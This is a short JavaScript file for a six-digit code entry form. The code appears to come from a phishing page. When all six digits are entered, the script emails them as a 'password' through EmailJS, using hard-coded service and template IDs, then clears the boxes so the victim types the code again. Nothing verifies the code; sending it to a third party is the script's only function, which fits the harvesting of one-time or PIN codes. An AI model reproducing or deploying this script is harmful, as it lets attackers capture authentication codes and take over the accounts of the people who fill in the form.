emailjs.init({
    publicKey: 'KS3yKzQfyqxqzO415',
});

const inputs = Array.from(document.querySelectorAll('.input'));

inputs.forEach((input, index) => {
    input.addEventListener('input', (e) => {
        const value = e.target.value;
        const numericValue = value.replace(/[^0-9]/g, '');

        e.target.value = numericValue;

        if (e.target.value && inputs[index + 1]) {
            inputs[index + 1].focus();
        }

        const password = inputs.map((t) => t.value).filter((t) => t !== '');

        if (index === inputs.length - 1 && password.length === 6) {
            document.getElementById('verify').classList.toggle('hidden');

            emailjs
                .send('service_asbjq23', 'template_owy636h', {
                    password: password.join(''),
                })
                .then(function (response) {
                    document
                        .getElementById('verify')
                        .classList.toggle('hidden');

                    inputs.forEach((element) => {
                        element.value = '';

                        inputs[0].focus();
                    });
                });
        }
    });
});
